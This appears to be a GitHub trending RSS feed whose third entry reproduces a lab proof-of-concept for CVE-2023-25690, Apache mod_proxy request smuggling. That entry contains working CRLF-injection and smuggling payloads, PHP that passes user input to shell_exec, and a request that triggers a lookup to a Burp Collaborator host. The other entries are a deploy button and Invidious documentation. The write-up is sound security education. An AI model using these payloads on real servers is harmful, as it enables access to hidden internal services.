<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Dockerfile Monthly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-07-01T02:11:19Z</updated>
  <subtitle>Monthly Trending of Dockerfile in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>sou6av/deploy-raganork</title>
    <updated>2023-07-01T02:11:19Z</updated>
    <id>tag:github.com,2023-07-01:/sou6av/deploy-raganork</id>
    <link href="https://github.com/sou6av/deploy-raganork" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;After forking this, click here:&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raganork.ml/heroku-deploy&#34; target=&#34;blank&#34;&gt;&lt;img align=&#34;center&#34; src=&#34;https://i.imgur.com/6rs61MY.png&#34; alt=&#34;Deploy bot&#34; height=&#34;112&#34; width=&#34;310&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>iv-org/documentation</title>
    <updated>2023-07-01T02:11:19Z</updated>
    <id>tag:github.com,2023-07-01:/iv-org/documentation</id>
    <link href="https://github.com/iv-org/documentation" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The official Invidious documentation&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;The Invidious documentation&lt;/h1&gt; &#xA;&lt;h2&gt;Running the documentation locally for development purposes&lt;/h2&gt; &#xA;&lt;p&gt;Run those commands in the repository&#39;s folder.&lt;/p&gt; &#xA;&lt;h3&gt;Local &lt;code&gt;mkdocs-material&lt;/code&gt; installation&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# You might want to create a virtualenv first&#xA;pip install mkdocs-material&#xA;mkdocs-material serve&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;With docker&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker run --rm -it -p 8000:8000 -v ${PWD}:/docs squidfunk/mkdocs-material:latest&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>dhmosfunk/CVE-2023-25690-POC</title>
    <updated>2023-07-01T02:11:19Z</updated>
    <id>tag:github.com,2023-07-01:/dhmosfunk/CVE-2023-25690-POC</id>
    <link href="https://github.com/dhmosfunk/CVE-2023-25690-POC" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE 2023 25690 - Proof of Concept&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;Published: 7 March 2023&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Base score&lt;/th&gt; &#xA;   &lt;th&gt;Confidentiality&lt;/th&gt; &#xA;   &lt;th&gt;Integrity impact&lt;/th&gt; &#xA;   &lt;th&gt;Availability impact&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;9.8&lt;/td&gt; &#xA;   &lt;td&gt;High&lt;/td&gt; &#xA;   &lt;td&gt;High&lt;/td&gt; &#xA;   &lt;td&gt;High&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Table of contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#advisory-description&#34;&gt;Advisory Description&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#vulnerable-apache-configuration-breakdown&#34;&gt;Vulnerable Apache Configuration Breakdown&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#data-flow&#34;&gt;Data Flow&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#lab-setup&#34;&gt;Lab Setup&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#http-request-splitting-causing-http-request-smuggling-on-backend-service&#34;&gt;HTTP Request Splitting causing HTTP Request Smuggling on backend service&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#identifying-the-crlf-injection&#34;&gt;Identifying the CRLF Injection&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#internal-http-request-smuggling-via-header-injection&#34;&gt;Internal HTTP Request Smuggling via Header Injection&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/#impact&#34;&gt;Impact&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Advisory Description&lt;/h3&gt; &#xA;&lt;p&gt;Some &lt;strong&gt;mod_proxy configurations&lt;/strong&gt; on Apache HTTP Server versions &lt;strong&gt;2.4.0&lt;/strong&gt; through &lt;strong&gt;2.4.55&lt;/strong&gt; allow a &lt;strong&gt;HTTP Request Smuggling attack&lt;/strong&gt;. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using &lt;strong&gt;variable substitution&lt;/strong&gt;. For example, something like:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;RewriteEngine on &#xA;RewriteRule &#34;^/here/(.*)&#34; &#34;http://example.com:8080/elsewhere?$1&#34;; [P] &#xA;ProxyPassReverse /here/ http://example.com:8080/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning. Users are recommended to update to at least version 2.4.56 of Apache HTTP Server.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://ubuntu.com/security/CVE-2023-25690&#34;&gt;https://ubuntu.com/security/CVE-2023-25690&lt;/a&gt; &lt;br&gt; &lt;a href=&#34;https://security.snyk.io/vuln/SNYK-UBUNTU2210-APACHE2-3355688&#34;&gt;https://security.snyk.io/vuln/SNYK-UBUNTU2210-APACHE2-3355688&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Vulnerable Apache Configuration Breakdown&lt;/h3&gt; &#xA;&lt;p&gt;With &lt;code&gt;RewriteEngine on&lt;/code&gt; included in apache configuration enables the URL rewriting engine. URL rewriting is a technique that allows web servers to dynamically change the URLs requested by a client&#39;s browser to a different URL before serving the content. &lt;br&gt; For example let&#39;s say that we have the following URL structure for a online e-shop:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;https://example-shop.com/categories/1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Assuming the following RewriteRule directive in an Apache configuration file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;RewriteRule &#34;^/categories/(.*)&#34; &#34;http://example-shop.com:8080/categories?id=$1&#34;; [P] &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When a user requests the URL &lt;code&gt;https://example-shop.com/categories/1&lt;/code&gt;, the RewriteRule will match the URL and capture the value &lt;code&gt;1&lt;/code&gt; using the regular expression &lt;code&gt;^/categories/(.*)&lt;/code&gt;. The rule then rewrites the URL to &lt;code&gt;http://example-shop.com:8080/categories?id=1&lt;/code&gt; by appending the captured value to the rewritten URL as a query parameter id.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;p&gt;Since the &lt;code&gt;[P]&lt;/code&gt; flag exists in the rule, Apache will treat the rewritten URL as a proxy request and forward it to the target server at &lt;code&gt;http://example-shop.com:8080/categories&lt;/code&gt; with the query parameter id set to &lt;code&gt;1&lt;/code&gt;. The target server will then process the request and send the response back to Apache, which will forward it to the client.&lt;/p&gt; &#xA;&lt;p&gt;In summary, the RewriteRule directive with the &lt;code&gt;[P]&lt;/code&gt; flag is used to rewrite URLs and proxy them to a different server. In this case, the rule matches URLs starting with &lt;code&gt;/categories/&lt;/code&gt; and appends the captured value as a query parameter id to the rewritten URL. Apache then forwards the request to the target server, which processes the request and returns the response.&lt;/p&gt; &#xA;&lt;p&gt;Finally regarding &lt;code&gt;ProxyPassReverse /categories/ http://example-shop.com:8080/&lt;/code&gt; this line simply replaces the backend server&#39;s domain and path with the proxy server&#39;s domain and path, so that the client is able to correctly follow links and access content from the proxied backend server as if it were being served directly from the proxy server.&lt;/p&gt; &#xA;&lt;h3&gt;Data Flow&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/assets/diagram.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Lab Setup&lt;/h2&gt; &#xA;&lt;p&gt;To simulate the vulnerabity in Apache we will use the &lt;strong&gt;httpd version 2.4.55&lt;/strong&gt;. Additionally, the entire lab will be dockerized for improved ease of setup, configuration, and reproducibility. &lt;br&gt;&lt;br&gt; The lab file structure will be the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;lab/&#xA;├── backend&#xA;│   ├── Dockerfile&#xA;│   └── src&#xA;│       ├── categories.php&#xA;│       └── index.php&#xA;├── docker-compose.yml&#xA;└── frontend&#xA;    ├── Dockerfile&#xA;    └── httpd.conf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The final &lt;strong&gt;httpd.conf&lt;/strong&gt; configuration is structed like below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ErrorLog &#34;/usr/local/apache2/logs/error.log&#34;&#xA;CustomLog &#34;/usr/local/apache2/logs/access.log&#34; common&#xA;&#xA;# Load necessary modules &#xA;LoadModule rewrite_module modules/mod_rewrite.so&#xA;LoadModule proxy_module modules/mod_proxy.so&#xA;LoadModule proxy_http_module modules/mod_proxy_http.so&#xA;&#xA;&amp;lt;VirtualHost *:80&amp;gt;&#xA;&#xA;    RewriteEngine on&#xA;    RewriteRule &#34;^/categories/(.*)&#34; &#34;http://192.168.10.100:8080/categories.php?id=$1&#34; [P]&#xA;    ProxyPassReverse &#34;/categories/&#34; &#34;http://192.168.10.100:8080/&#34;&#xA;&#xA;&amp;lt;/VirtualHost&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;docker-compose.exe up --build&lt;/code&gt; command to start the lab.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;mod_rewrite&lt;/strong&gt; documentation: &lt;a href=&#34;https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html&#34;&gt;https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html&lt;/a&gt; &lt;br&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;mod_proxy&lt;/strong&gt; documentation: &lt;a href=&#34;https://httpd.apache.org/docs/2.4/mod/mod_proxy.html&#34;&gt;https://httpd.apache.org/docs/2.4/mod/mod_proxy.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;HTTP Request Splitting causing HTTP Request Smuggling on backend service&lt;/h2&gt; &#xA;&lt;p&gt;In this section, I will explain how a CRLF injection can lead to internal HTTP Request Smuggling, enabling an attacker to gain unauthorized access to internal resources that would otherwise be inaccessible.&lt;/p&gt; &#xA;&lt;h3&gt;Identifying the CRLF Injection&lt;/h3&gt; &#xA;&lt;p&gt;Based on the advisory description the httpd &amp;lt;=2.4.55 is vulnerable to HTTP Response Splitting also known as CRLF Injection. &lt;br&gt; The CRLF Injection occurs when:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Data enters a web application through an untrusted source, most frequently an HTTP request&lt;/li&gt; &#xA; &lt;li&gt;The data is included in an HTTP response header sent to a web user without being validated for malicious characters.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;which in our case can be confirmed passing the following CRLF prefix in URL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt; HTTP/1.1\r\nFoo: baarr\r\n\r\n&#xA;%20HTTP/1.1%0d%0aFoo:%20baarr&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By appending the above prefix to the URL, the resulting final request will be as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;GET /categories/1%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1&#xA;Host: 192.168.1.103&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Following the request, the server will process the data and return a 200 response code indicating vulnebility to CRLF Injection.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;HTTP/1.1 200 OK&#xA;Date: Mon, 22 May 2023 02:05:28 GMT&#xA;Server: Apache/2.4.54 (Debian)&#xA;X-Powered-By: PHP/7.4.33&#xA;Content-Length: 21&#xA;Content-Type: text/html; charset=UTF-8&#xA;&#xA;You category ID is: 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;More information regarding HTTTP Request Splitting can be found here, &lt;a href=&#34;https://owasp.org/www-community/attacks/HTTP_Response_Splitting&#34;&gt;https://owasp.org/www-community/attacks/HTTP_Response_Splitting&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Internal HTTP Request Smuggling via Header Injection&lt;/h3&gt; &#xA;&lt;p&gt;Using the header injection we will perform the internal HTTP Request Smuggling.&lt;br&gt; Lets begin with the following prefix:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; HTTP/1.1\r\nHost: localhost\r\n\r\nGET /SMUGGLED&#xA;%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and the following request&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1&#xA;Host: 192.168.1.103&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Applying the rewrite rule, the request undergoes a transformation into the following format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;GET /categories.php?id=1 HTTP/1.1&#xA;Host: localhost&#xA;&#xA;GET /SMUGGLED HTTP/1.1&#xA;Host: backend&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;where the encoded URL is decoded into valid HTTP syntax causing the backend to treat the decoded data as second request. &lt;img src=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/assets/smuggled.png&#34; alt=&#34;&#34;&gt; &lt;br&gt; Suppose that our internal application has the following secret code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;#Internal secret functionality&#xA;if(isset($_GET[&#39;secret&#39;])){&#xA;    $secret = $_GET[&#39;secret&#39;];&#xA;&#xA;    shell_exec(&#39;nslookup &#39; . $secret);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;with the following prefix we are able to send the second request to hidden functionallity:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; HTTP/1.1\r\nHost: localhost\r\n\r\nGET /categories.php?secret=im8uzc5sbq7xasyxk5yhfc734uaky9.burpcollaborator.net&#xA;%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php?secret=im8uzc5sbq7xasyxk5yhfc734uaky9.burpcollaborator.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php%3fsecret%3dq0r2dkj0pyl5o0c5ydcptklbi2otci.burpcollaborator.net HTTP/1.1&#xA;Host: 192.168.1.103&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and retrieve the request on burp collaborator: &lt;img src=&#34;https://raw.githubusercontent.com/dhmosfunk/CVE-2023-25690-POC/main/assets/request.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Patches:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/apache/httpd/commit/8789f6bb926fa4c33b4231a8444340515c82bdff&#34;&gt;https://github.com/apache/httpd/commit/8789f6bb926fa4c33b4231a8444340515c82bdff&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/apache/httpd/commit/8b93a6512f14f5f68887ddfe677e91233ed79fb0&#34;&gt;https://github.com/apache/httpd/commit/8b93a6512f14f5f68887ddfe677e91233ed79fb0&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Impact&lt;/h2&gt; &#xA;&lt;p&gt;The impact of this vulnerability is that it allows attackers to target and access internal applications that are meant to be hidden by the reverse proxy, potentially leading to unauthorized access, data leakage, or further exploitation.&lt;/p&gt;</summary>
  </entry>
</feed>